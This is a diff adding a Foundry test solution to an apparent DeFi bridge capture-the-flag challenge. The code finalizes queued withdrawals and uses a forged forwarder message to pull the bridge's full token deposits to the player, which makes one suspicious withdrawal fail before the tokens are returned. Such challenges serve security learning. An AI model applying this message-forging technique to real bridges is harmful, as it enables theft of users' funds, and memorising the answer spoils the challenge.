@@ -89,7 +89,78 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // Read the JSON to prepare data for finalization of withdrawal
+        string memory root = vm.projectRoot();
+        string memory path = string.concat(root, "/test/withdrawal/withdrawals.json");
+        string memory json = vm.readFile(path);
+
+        uint256[] memory noncesArray;
+        address[] memory callersArray;
+        address[] memory targetsArray;
+        bytes[] memory dataArray;
+
+        // Parse the topics form the JSON
+        bytes memory noncesJson = vm.parseJson(json, "..topics[1]");
+        noncesArray = abi.decode(noncesJson, (uint256[]));
+
+        bytes memory callersJson = vm.parseJson(json, "..topics[2]");
+        callersArray = abi.decode(callersJson, (address[]));
+
+        bytes memory targetsJson = vm.parseJson(json, "..topics[3]");
+        targetsArray = abi.decode(targetsJson, (address[]));
+
+        // Parse data from JSON
+        bytes memory dataJson = vm.parseJson(json, "..data");
+        dataArray = abi.decode(dataJson, (bytes[]));
+
+        vm.warp(block.timestamp + 8 days);
+
+        for (uint256 i = 0; i < WITHDRAWALS_AMOUNT; i++) {
+            // The function already handles the suspicious withdrawal
+            _finalizeWithdrawal(noncesArray[i], callersArray[i], targetsArray[i], dataArray[i]);
+        }
+    }
+
+    function _finalizeWithdrawal(uint256 nonce, address caller, address target, bytes memory eventData) private {
+        (, uint256 timestamp, bytes memory messageData) = abi.decode(eventData, (bytes32, uint256, bytes));
+
+        if (nonce == 2) {
+            uint256 tokenAmount = l1TokenBridge.totalDeposits();
+            _handleTokens(true, tokenAmount);
+            l1Gateway.finalizeWithdrawal(nonce, caller, target, timestamp, messageData, new bytes32[](0));
+            _handleTokens(false, tokenAmount);
+            return;
+        }
+
+        l1Gateway.finalizeWithdrawal(nonce, caller, target, timestamp, messageData, new bytes32[](0));
+    }
+
+    function _handleTokens(bool op, uint256 tokenAmount) private {
+        // Withdraw tokens to fail the suspicious withdrawal
+        if (op) {
+            bytes memory dataForL1Gateway = abi.encodeCall(
+                L1Forwarder.forwardMessage,
+                (
+                    0,
+                    address(l2Handler),
+                    address(l1TokenBridge),
+                    abi.encodeCall(TokenBridge.executeTokenWithdrawal, (address(player), tokenAmount))
+                )
+            );
+
+            l1Gateway.finalizeWithdrawal(
+                0,
+                address(l2Handler),
+                address(l1Forwarder),
+                (block.timestamp - 8 days),
+                dataForL1Gateway,
+                new bytes32[](0)
+            );
+            return;
+        }
+
+        // Send tokens back to the bridge
+        token.transfer(address(l1TokenBridge), tokenAmount);
     }
 
     /**
